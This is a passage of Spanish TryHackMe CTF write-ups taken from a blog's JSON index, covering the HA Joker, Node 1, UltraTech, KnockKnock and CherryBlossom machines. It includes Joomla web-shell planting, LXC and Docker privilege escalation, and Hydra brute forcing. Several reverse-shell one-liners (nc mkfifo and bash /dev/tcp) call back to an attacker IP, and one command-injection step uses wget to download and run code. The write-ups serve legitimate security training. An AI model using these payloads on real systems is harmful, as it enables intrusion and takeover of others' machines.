4 5 6 7 8 9 10 11  root@aoiri:~/tryhackme/jokerctf# john hash_joomla --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ****** (?) 1g 0:00:00:12 DONE (2020-02-27 16:14) 0.08130g/s 83.41p/s 83.41c/s 83.41C/s bullshit..bulldogs Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/jokerctf#   Ahora podemos iniciar sesion en el panel de joomla, vamos a crear un archivo el cual ejecute comandos en el sistema. Nos dirigimos a Extensions -\u0026gt; Templates, Seleccionamos protostar el cual esta siendo utilizado en la pagina de joomla.\nCreamos un archivo en el template protostar.\nEjecutamos comandos utilizando la URL http://jokerctf.thm:8080/templates/protostar/shell.php?cmd=id.\nObtenemos una shell utilizando nuestra shell, creamos un archivo shell.sh el cual contiene una shell inversa, la descargamos en la maquina y la ejecutamos.\nObtenemos una shell con el usuario www-data.\nPRIVILEGE ESCALATION Vemos que el usuario www-data pertenece al grupo lxc, logramos listar las images que estan disponibles en la maquina.\nUtilizamos lxc para poder crear un contenedor y montar la carpeta /root en /mnt/root:\nLXD Alpine Builder\nLXD - Privilege Escalation\nComandos:\n1 2 3 4 5 6 7 8  #Descargamos alpine en la maquina en la carpeta /tmp lxc image import ./alpine-v3.11-x86_64-20200227_1750.tar.gz --alias myimage lxc image list lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh   Logramos obtener una shell cn el usuario root y nuestra flag \u0026ldquo;root.txt\u0026rdquo;.\n","description":"HA Joker CTF es una maquina de TryHackMe, enfocada en la tematica de Joker donde descubrimos un login donde utilizamos Hydra para obtener acceso, que luego nos permitió obtener un backup de la base de datos de Joomla, y con este ultimo obtuvimos acceso modificando una plantilla. Finalmente escalamos privilegios creando un nuevo contenedor con privilegios con lxc.","id":100,"section":"posts","tags":["lxc","hydra","joomla"],"title":"TryHackMe - HA Joker CTF","uri":"https://sckull.github.io/posts/jokerctf/"},{"content":"  Node 1 es una maquina de TryHackMe, expone una API donde conseguimos credenciales luego un backup en el cual obtuvimos credenciales para ingresar por SSH. INsertamos una shell inversa en la base de datos para que un CronJob nos diera acceso al siguiente usuario. Finalmente escalamos privilegios utilziando un exploit del Kernel de Linux.\nRoom    Titulo Node 1      Descripción Node is a medium level boot2root challenge, originally created for HackTheBox.   Puntos *   Dificultad Media   Maker coderj     NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.27.51 Nmap scan report for 10.10.27.51 Host is up (0.22s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 3000/tcp open http Node.js Express framework Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 26 23:43:56 2020 -- 1 IP address (1 host up) scanned in 378.90 seconds   HTTP - Puerto 3000 En el puerto 3000 encontramos una pagina que nos muestra tres usuarios.\nAl analizar el codigo fuente de la pagina nos encontramos con los controladores de la pagina.\nEn el controlador de home.js encontramos una ruta de una api a la que hace una solicitud.\nHacemos una consulta a la ruta y nos devuelve tres usuarios, contraseñas encriptadas y que los usuarios no son administradores:\nUtilizamos crackstation.net para crackear las contraseñas, solo obtuvimos la contraseña de los primeros dos usuarios:\nEn el controlador profile.js encontramos que existe otra ruta en la que se hacen consultas de un usuario especifico pero al hacer una consulta sin un usuario nos muestra nuevamente la lista de usuarios con su contraseña, pero en esta respuesta nos aparece un usuario nuevo el cual es administrador:\nHash crackeada:\nUtilizamos las credenciales del usuario nuevo y nos redirige a una pagina nueva en la que podemos descargar un archivo:\nEl archivo contiene una cadena codificada en base64, al decodificarla vemos que es un archivo zip, pero este esta protegido por contraseña:\nUtilizamos fcrackzip para hacer un ataque de fuerza bruta:\nUSER - MARK Al descomprimir el archivo zip encontramos que, es un backup de la ruta donde se encuentran los archivos de la pagina (/var/html/myplace/). Vemos la contraseña de la conexion de mongodb con el usuario mark, utilizamos estas credenciales para iniciar sesion en el servicio SSH.\nObtenemos una shell con el usuario mark.\nUSER - TOM En la carpeta /var/scheduler encontramos una aplicacion la cual contiene una base de datos distinta, y la cual se ejecuta cada 30 segundos, ademas de eso vemos entre los procesos en ejecucion que esta aplicacion la esta ejecutando el usuario tom. La aplicacion realiza una iteracion en la tabla tasks y la ejecuta, luego la elimina.\nInsertamos una shell inversa en la tabla tasks (coleccion):\n1  db.tasks.insert({ \u0026#34;cmd\u0026#34;: \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f\u0026#34; });   Despues de 30 segundos se ejecuta nuestra shell inversa y obtenemos una shell con el usuario tom y nuestra flag user.txt.\nPRIVILEGE ESCALATION Vemos la version del kernel y buscamos la misma en searchsploit, vemos que existe un exploit que nos puede ayudar a escalar privilegios.\n CVE-2017-16995  Lo compilamos, descargamos en la maquina, le damos permisos de ejecucion, lo ejecutamos y obtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"Node 1 es una maquina de TryHackMe, expone una API donde conseguimos credenciales luego un backup en el cual obtuvimos credenciales para ingresar por SSH. INsertamos una shell inversa en la base de datos para que un CronJob nos diera acceso al siguiente usuario. Finalmente escalamos privilegios utilziando un exploit del Kernel de Linux.","id":101,"section":"posts","tags":["xxd","nodejs","kernel"],"title":"TryHackMe - Node 1","uri":"https://sckull.github.io/posts/nodeone/"},{"content":"  Ultratech es una maquina de TryHackMe, realizamos una enumeracion a la API donde realizamos Command Injection. Encontramos hashes dentro de una base de datos que nos dieron acceso al siguiente usuario. Finalmente utilizamos Docker para escalar privilegios.\nRoom    Titulo UltraTech      Descripción The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing   Puntos 400   Dificultad Media   Maker lp1     NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.223.47 Nmap scan report for 10.10.223.47 Host is up (0.18s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 8081/tcp open http Node.js Express framework 31331/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 25 22:36:00 2020 -- 1 IP address (1 host up) scanned in 1451.43 seconds   WFUZZ - Puerto 8081 Utilizamos WFUZZ para encontrar directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@aoiri:~/tryhackme/ultratech# wfuzz -w /usr/share/wordlists/dirb/common_nofirst10.txt -u http://10.10.223.47:8081/FUZZ --sc 200 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://10.10.223.47:8081/FUZZ Total requests: 4586 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000001: 200 0 L 3 W 20 Ch \u0026#34;\u0026#34; 000000487: 200 0 L 8 W 39 Ch \u0026#34;auth\u0026#34; Total time: 429.3228 Processed Requests: 4586 Filtered Requests: 4584 Requests/sec.: 10.68193   GOBUSTER - Puerto 31331 Ya que en este puerto esta corriendo el servicio de APACHE utilizamos gobuster para encontrar directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@aoiri:~/tryhackme/ultratech# gobuster dir -u http://10.10.223.47:31331 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -x php,html,txt -q /css (Status: 301) /favicon.ico (Status: 200) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /partners.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /what.html (Status: 200) root@aoiri:~/tryhackme/ultratech#   WWW - Shell Enumeramos las paginas que encontramos en el puerto 31331 y al visitar partners.html encontramos una panel de inicio de sesion.\nAnalizamos el codigo fuente y encontramos un archivo de javascript en el que nos muestra una ruta nueva con su parametro de la API que esta corriendo en el servicio de Node.js en el puerto 8081.\nEn el parametro ingresamos nuestra IP, y ejecutamos tcpdump para capturar paquetes ICMP.\nVemos que la maquina nos hace ping. Utilizamos \u0026ldquo;Command Injection\u0026rdquo; para poder ejecutar comandos, utilizamos ` (acento grave | codigo ascii 96) para \u0026ldquo;escapar\u0026rdquo; la ejecucion del comando ping. Creamos un archivo bash en el que escribimos nuestra shell inversa, en la ruta de la API ejecutamos comandos para: descargar el archivo y ejecutar el archivo.\nshell.sh:\n1  bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.1.72/4242 0\u0026gt;\u0026amp;1   Commandos:\n1 2 3 4 5  #Primer comando wget 10.8.1.72/shell.sh -o shell.sh #Segundo Comando bash shell.sh   Ejecutamos los comandos como parametro en la URL:\nview-source:http://10.10.223.47:8081/ping?ip=`wget 10.8.1.72/shell.sh -o shell.sh` view-source:http://10.10.223.47:8081/ping?ip=`bash shell.sh` Una vez hecho esto, logramos obtener una shell con el usuario www:\nCommand Injection\nUSER - r00t Dentro de los archivos de la maquina encontramos una base de datos, la pasamos a nuestra maquina para poder ver los datos que tiene.\nEn la base de datos encontramos la tabla de \u0026lsquo;users\u0026rsquo; en donde encontramos dos usuarios y su contraseña encriptada:\nUtilizamos crackstation para crackear las hashes:\nVemos que los usuarios registrados en la maquina aparece r00t utilizamos la contraseña crackeada y logramos obtener una shell con este usuario.\nFTP-SSH De igual forma con las credenciales de r00t podemos ingresar al servicio de FTP y SSH.\nPRIVILEGE ESCALATION Una pequeña enumeracion basta para poder tener la idea de lo que debemos de hacer, en este caso encontramos que el usuario r00t pertenece al grupo de docker. Utilizamos docker para obtener una shell con el usuario root.\nDocker GTFOBINS\n","description":"Ultratech es una maquina de TryHackMe, realizamos una enumeracion a la API donde realizamos Command Injection. Encontramos hashes dentro de una base de datos que nos dieron acceso al siguiente usuario. Finalmente utilizamos Docker para escalar privilegios.","id":102,"section":"posts","tags":["sqlite","ftp","docker"],"title":"TryHackMe - Ultratech","uri":"https://sckull.github.io/posts/ultratech/"},{"content":"  KnockKnock es una maquina de TryHackMe, se presentan retos CTF Like lo que permitió acceso por SSH tras realizar port knocking. Descubrimos un exploit en el Kernel de Linux lo que nos dio acceso privilegiado.\nRoom    Titulo KnockKnock      Descripción Knock knock, who\u0026rsquo;s there? Pcaps \u0026amp; port knocking   Puntos *   Dificultad Media   Maker ben     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Mon Feb 24 16:44:16 2020 as: nmap -p- -T4 -sV -sC -o nmap_scan 10.10.220.35 Warning: 10.10.220.35 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.220.35 Host is up (0.15s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Feb 24 17:02:22 2020 -- 1 IP address (1 host up) scanned in 1085.70 seconds   En la pagina principal nos muestra un mensaje junto con un enlace que nos redirige hacia un archivo PCAP.\nKnock Vemos que la IP (192.168.56.102) esta realizando solicitudes a la IP2 (192.168.56.101) utilizando los puertos 7000, 8000, 9000, 7000, 8000, 9000, 8888. Utilizamos knockd utilizando los puertos que encontramos y realizamos un escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 7000 8000 9000 7000 8000 9000 8888 \u0026amp;\u0026amp; nmap 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:11 CST Nmap scan report for 10.10.220.35 Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE 80/tcp open http 8888/tcp open sun-answerbook Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds root@aoiri:~/tryhackme/knockknock#   HTTP Visitamos la IP con el puerto 8888 y encontramos una nueva direccion de la pagina.\nPCAP FILE En la direccion encontramos nuevamente un archivo PCAP:\nAl analizar el archivo PCAP encontramos una solicitud en la que se muestra una imagen en ASCII con un mensaje:\nEl mensaje esta en aleman por lo que utilizamos google para traducir el mensaje:\nMensaje:\n1 3 3 7 KNOCK 2 Utilizamos los puerto 1, 3, 3 y 7 con knock, y utilizamos nmap para escanear el puerto 1337:\n1 2 3 4 5 6 7 8 9  root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 1 3 3 7 \u0026amp;\u0026amp; nmap -p1337 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:31 CST Nmap scan report for 10.10.220.35 Host is up (0.16s latency). PORT STATE SERVICE 1337/tcp open waste Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds   Visitamos el puerto y encontramos una nueva direccion:\nEncontramos en la direccion un string en base64:\nAl traducirlo encontramos varios puertos que indican que es para el servicio SSH:\n1 2 3  root@aoiri:~/tryhackme/knockknock# echo T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK | base64 -d Open up SSH: 8888 9999 7777 6666 root@aoiri:~/tryhackme/knockknock#   Utilizamos los puertos con knock y analizamos nuevamente la IP con nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 8888 9999 7777 6666 \u0026amp;\u0026amp; nmap -sV -sC 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:35 CST Nmap scan report for 10.10.220.35 Host is up (0.16s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 8d:1f:97:c6:4d:e9:1d:2b:5d:b8:6e:64:66:bb:48:2b (DSA) | 2048 02:31:1c:77:aa:c1:f6:2b:d3:09:f6:e0:63:fe:a9:37 (RSA) | 256 fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79 (ECDSA) |_ 256 cc:5c:76:be:e8:93:b8:55:ef:e8:a3:bd:64:76:2d:75 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.73 seconds   BUTTHEAD - USER Vemos que el servicio SSH esta abierto en el puerto 22, intentamos conectarnos al puerto 22 sin ningun usuario y al conectarnos nos muestra un mensaje donde nos muestra el usuario y su contraseña:\nIntentamos conectarnos con las credenciales pero nos cierra la sesion rapidamente, ademas de eso nos muestra un mensaje en el que nos indica que tenemos un segundo de conexion.\nUtilizamos el parametro -f para poder ejecutar comandos al conectarnos en el servicio, vemos que el comando ls -lah se ejecuta:\nEjecutamos una shell inversa:\n1 2 3 4 5 6 7 8  root@aoiri:~/tryhackme/knockknock# knock 10.10.108.150 8888 9999 7777 6666 \u0026amp;\u0026amp; ssh butthead@10.10.108.150 -f \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f\u0026#39; ############################################ # CONGRATS! YOU HAVE OPENED THE SSH SERVER # # USERNAME: butthead # # PASSWORD: ********** # ############################################ butthead@10.10.108.150\u0026#39;s password: root@aoiri:~/tryhackme/knockknock#   Y obtenemos shell con el usuario butthead.\nPRIVILEGE ESCALATION Enumeramos la maquina en busqueda de aplicaciones, archivos, directorios vulnerables. Encontramos que el kernel de esta maquina en su version 3.13.0-46-generic es vulnerable. Descargamos el exploit en la maquina, lo compilamos y ejecutamos el exploit, obtenemos una shell con usuario root.\n","description":"KnockKnock es una maquina de TryHackMe, se presentan retos CTF Like lo que permitió acceso por SSH tras realizar port knocking. Descubrimos un exploit en el Kernel de Linux lo que nos dio acceso privilegiado.","id":103,"section":"posts","tags":["knockd","port knocking","kernel"],"title":"TryHackMe - KnockKnock","uri":"https://sckull.github.io/posts/knockknock/"},{"content":"  CherryBlossom es una maquina de TryHackMe, expone SMB donde encontramos una imagen codificada, por medio de esteganografia obtuvimos un wordlist y usuario, tras ejecutar Hydra a SSH obtuvimos acceso. Realizamos movimiento lateral crackeando la contraseña de un backup de shadow. Para escalar privilegios explotamos una vulnerabilidad en sudo.\nRoom    Titulo CherryBlossom      Descripción Boot-to-root with emphasis on crypto and password cracking.   Puntos 90   Dificultad Dificil   Maker MuirlandOracle     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445,139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Fri Feb 21 18:25:06 2020 as: nmap -p- -sV -o nmap_scan 10.10.214.121 Nmap scan report for 10.10.214.121 Host is up (0.28s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 21 18:43:37 2020 -- 1 IP address (1 host up) scanned in 1111.32 seconds   USER Enum4linux Utilizamos esta herramienta para obtener informacion del servicio de SAMBA y LDAP.\nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Feb 21 18:28:18 2020 ========================== | Target Information | ========================== Target ........... 10.10.214.121 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ===================================================== | Enumerating Workgroup/Domain on 10.10.214.121 | ===================================================== [+] Got domain/workgroup name: WORKGROUP ============================================= | Nbtstat Information for 10.10.214.121 | ============================================= Looking up status of 10.10.214.121 UBUNTU \u0026lt;00\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Workstation Service UBUNTU \u0026lt;03\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Messenger Service UBUNTU \u0026lt;20\u0026gt; - B \u0026lt;ACTIVE\u0026gt; File Server Service ..__MSBROWSE__. \u0026lt;01\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Master Browser WORKGROUP \u0026lt;00\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Domain/Workgroup Name WORKGROUP \u0026lt;1d\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Master Browser WORKGROUP \u0026lt;1e\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 [... snip ...] ============================================ | Getting domain SID for 10.10.214.121 | ============================================ Domain Name: WORKGROUP Domain Sid: (NULL SID) [+] Can't determine if host is part of domain or part of a workgroup ======================================= | OS information on 10.10.214.121 | ======================================= [+] Got OS info for 10.10.214.121 from smbclient: [+] Got OS info for 10.10.214.121 from srvinfo: UBUNTU Wk Sv PrQ Unx NT SNT Samba 4.7.6-Ubuntu platform_id :\t500 os version :\t6.1 server type :\t0x809a03 ============================== | Users on 10.10.214.121 | ============================== index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: samba\tName: Desc: user:[samba] rid:[0x3e8] ========================================== | Share Enumeration on 10.10.214.121 | ========================================== Sharename Type Comment --------- ---- ------- Anonymous Disk Anonymous File Server Share IPC$ IPC IPC Service (Samba 4.7.6-Ubuntu) SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.214.121 //10.10.214.121/Anonymous\tMapping: OK, Listing: OK //10.10.214.121/IPC$\t[E] Can't understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* [... snip ...] [... snip ...] ======================================================================== | Users on 10.10.214.121 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================== [I] Found new SID: S-1-22-1 [I] Found new SID: S-1-5-21-3394966362-3970299913-3211979797 [I] Found new SID: S-1-5-32 [+] Enumerating users using SID S-1-5-32 and logon username '', password '' [... snip ...] S-1-5-32-544 BUILTIN\\Administrators (Local Group) S-1-5-32-545 BUILTIN\\Users (Local Group) S-1-5-32-546 BUILTIN\\Guests (Local Group) S-1-5-32-547 BUILTIN\\Power Users (Local Group) S-1-5-32-548 BUILTIN\\Account Operators (Local Group) S-1-5-32-549 BUILTIN\\Server Operators (Local Group) S-1-5-32-550 BUILTIN\\Print Operators (Local Group) [... snip ...] [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1001 Unix User\\johan (Local User) S-1-22-1-1002 Unix User\\lily (Local User) [+] Enumerating users using SID S-1-5-21-3394966362-3970299913-3211979797 and logon username '', password '' S-1-5-21-3394966362-3970299913-3211979797-500 *unknown*\\*unknown* (8) S-1-5-21-3394966362-3970299913-3211979797-501 UBUNTU\\nobody (Local User) [... snip ...] S-1-5-21-3394966362-3970299913-3211979797-513 UBUNTU\\None (Domain Group) [... snip ...] S-1-5-21-3394966362-3970299913-3211979797-1000 UBUNTU\\samba (Local User) [... snip ...] ============================================== | Getting printer info for 10.10.214.121 | ============================================== No printers returned. enum4linux complete on Fri Feb 21 18:47:43 2020 Nos logeamos en el SHARENAME Anonymous:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@aoiri:~# smbclient \\\\\\\\10.10.214.121\\\\Anonymous Enter WORKGROUP\\root\u0026#39;s password: Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Feb 9 18:22:51 2020 .. D 0 Sun Feb 9 11:48:18 2020 journal.txt N 3470998 Sun Feb 9 18:20:53 2020 in 10253588 blocks of size 1024. 5083492 blocks available smb: \\\u0026gt; get journal.txt getting file \\journal.txt of size 3470998 as journal.txt (334.1 KiloBytes/sec) (average 334.1 KiloBytes/sec) smb: \\\u0026gt;   STEGO El archivo journal.txt contiene una cadena base64 decodificamos el archivo y vemos que el header del archivo pertenece a una imagen PNG:\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/tryhackme/cherryblossom# xxd file|head 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 00000010: 0000 0500 0000 0355 0802 0000 00a8 15c4 .......U........ 00000020: de00 0100 0049 4441 5478 da24 fd57 b0ee .....IDATx.$.W.. 00000030: 5b76 dd87 adbc fef1 cbfb db39 9d1c 6ece [v.........9..n. 00000040: dd7d 3ba2 9be8 6e34 0812 4c82 400b 2265 .};...n4..L.@.\u0026#34;e 00000050: 9669 5145 3d58 65ca 2597 5d96 4359 2e27 .iQE=Xe.%.].CY.\u0026#39; 00000060: 49a4 5c76 5952 1545 1206 099a 8009 a0d1 I.\\vYR.E........ 00000070: 4027 74ee 7bfb e670 ce3d 619f 9df7 fef2 @\u0026#39;t.{..p.=a..... 00000080: f7cf 2b2f 3ff4 e378 99cf a3c6 fccd 39e0 ..+/?..x......9. 00000090: eeb5 bb0e 3804 8183 0079 e8a0 471e 5964 ....8....y..G.Yd   Cambiamos el archivo a .PNG y la imagen parece no tener nada:\nDespues de intentar con una gran cantidad de herramientas de esteganografia finalmente con stegpy logramos extraer un archivo:\n1 2 3 4 5  root@872e41903b6a:/data# stegpy file.png File _journal.zip succesfully extracted from file.png root@872e41903b6a:/data# file _journal.zip _journal.zip: JPEG image data root@872e41903b6a:/data#   Vemos que el archivo esta con extension zip pero los headers de este son en JPGE, editamos el archivo con los \u0026ldquo;magic numbers\u0026rdquo; de un archivo ZIP.\n1 2 3 4 5  ➜ ctf unzip journal_dat.zip Archive: journal_dat.zip [journal_dat.zip] Journal.ctz password: skipping: Journal.ctz incorrect password ➜ ctf   El archivo esta protegido con contraseña utilizamos fcrackzip para encontrar la contraseña del archivo:\n1 2 3  ➜ ctf fcrackzip -D -u -p /home/sckull/tools/rockyou.txt journal_dat.zip PASSWORD FOUND!!!!: pw == s[... snip ...]r ➜ ctf   Extraemos un archivo ctz, utilizamos 7zjohn para obtener el hash para poder crackearlo con john:\n1  ➜ ctf perl 7zjohn.pl Journal.ctz \u0026gt; hash.txt   Utilizamos john y rockyou para obtener la contraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@aoiri:~/tryhackme/cherryblossom# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES]) Cost 1 (iteration count) is 524288 for all loaded hashes Cost 2 (padding size) is 5 for all loaded hashes Cost 3 (compression type) is 2 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:01:45 0.02% (ETA: 2020-02-29 18:28) 0g/s 26.33p/s 26.33c/s 26.33C/s puppy1..victoria1 t[... snip ...]y (Journal.ctz) 1g 0:00:03:40 DONE (2020-02-21 23:29) 0.004525g/s 25.34p/s 25.34c/s 25.34C/s brownsugar..inferno Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/cherryblossom#   Extraemos el archivo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ➜ tmp 7z e Journal.ctz 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 70434 bytes (69 KiB) Extracting archive: Journal.ctz -- Path = Journal.ctz Type = 7z Physical Size = 70434 Headers Size = 146 Method = LZMA2:16 7zAES Solid = - Blocks = 1 Enter password (will not be echoed): Everything is Ok Size: 158136 Compressed: 70434 ➜ tmp ls Journal.ctd Journal.ctz ➜ tmp   HYDRA - SSH Encontramos un archivo CTD, en su interior vemos un \u0026ldquo;diario\u0026rdquo; que pertenece a Johan, en donde explica que esta escribiendo un wordlist super seguro. Utilizamos el wordlist cherry-blossom.list con el usuario Lily junto con hydra y obtenemos la contraseña en el servicio SSH:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@aoiri:~/tryhackme/cherryblossom# hydra -l lily -P wordlists/cherry-blossom.list ssh://10.10.76.210 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-21 23:44:12 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task [DATA] attacking ssh://10.10.76.210:22/ [STATUS] 102.00 tries/min, 102 tries in 00:01h, 9821 to do in 01:37h, 16 active [STATUS] 112.00 tries/min, 336 tries in 00:03h, 9587 to do in 01:26h, 16 active [22][ssh] host: 10.10.76.210 login: lily password: M[... snip ...]3 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-21 23:51:03 root@aoiri:~/tryhackme/cherryblossom#   Logramos obtener una shell con el usuario lily:\nUSER - Johan Los archivos de backup siempre tienen cosas interesantes, en esta maquina encontramos un backup de las contraseñas de /etc/shadow, utilizamos john para crackear las contraseña de johan.\nUtilizamos el wordlist que encontramos antes:\n1 2 3 4 5 6 7 8 9 10  ➜ john shadow_hashes --wordlist=/home/sckull/vmware/share/ctf/tmp/wordlists/cherry-blossom.list Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:12 27% 0g/s 222.5p/s 452.9c/s 452.9C/s $hickory$..$happiness 0g 0:00:00:23 52% 0g/s 225.1p/s 454.5c/s 454.5C/s $3x!4l!f3..$20robyn06$ [... snip ...s] (johan) 1g 0:00:00:36 100% 0.02721g/s 270.0p/s 452.9c/s 452.9C/s #2lovely..#2little Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed ➜   Cambiamos al usuario johan y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos sudo, pero notamos que al ingresar la contraseña, esta, se muestra en pantalla como asteriscos (esto nos recuerda a la maquina 